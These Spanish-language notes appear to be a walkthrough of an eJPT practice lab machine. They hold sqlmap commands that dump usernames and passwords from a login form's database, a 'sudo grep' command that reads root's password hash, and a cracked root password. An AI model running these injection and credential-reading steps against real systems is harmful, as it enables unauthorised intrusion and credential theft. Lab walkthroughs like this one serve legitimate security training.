- ---
- Tags: #ejptmachine #sqlmap #sqlinyection 
---

![Pasted image 20250216162304](../../Fotos/Pasted%20image%2020250216162304.png)

![Pasted image 20250216162319](../../Fotos/Pasted%20image%2020250216162319.png)

![Pasted image 20250216162515](../../Fotos/Pasted%20image%2020250216162515.png)

`sqlmap http://172.17.0.2/login.html --forms --dbs -batch`
- Descubrir bases de datos de la web
![Pasted image 20250216162824](../../Fotos/Pasted%20image%2020250216162824.png)

`sqlmap http://172.17.0.2/login.html --forms -D users --tables -batch`
- Ver el contenido de la base de datos de users
![Pasted image 20250216163006](../../Fotos/Pasted%20image%2020250216163006.png)

`sqlmap http://172.17.0.2/login.html --forms -D users -T usuarios -columns -batch`
![Pasted image 20250216163227](../../Fotos/Pasted%20image%2020250216163227.png)

`sqlmap http://172.17.0.2/login.html --forms -D users -T usuarios -C id,password,username -dump -batch`
![Pasted image 20250216163430](../../Fotos/Pasted%20image%2020250216163430.png)

![Pasted image 20250216163910](../../Fotos/Pasted%20image%2020250216163910.png)

*Nota:*
- (Nosotros sabemos que hay un archivo pass.hash en el directorio de root porque el binario *ls* esta con permisos SUID y al enumerar el contenido del directorio de root nos aparece como usuario no privilegiado)

`sudo grep '' $LFILE`
- Con el binario grep intentaremos leer la contraseña hasheada de root
![Pasted image 20250216164246](../../Fotos/Pasted%20image%2020250216164246.png)

*Usaremos MD5 o crackstation.net*
![Pasted image 20250216164426](../../Fotos/Pasted%20image%2020250216164426.png)
- spongebob34

![Pasted image 20250216164602](../../Fotos/Pasted%20image%2020250216164602.png)

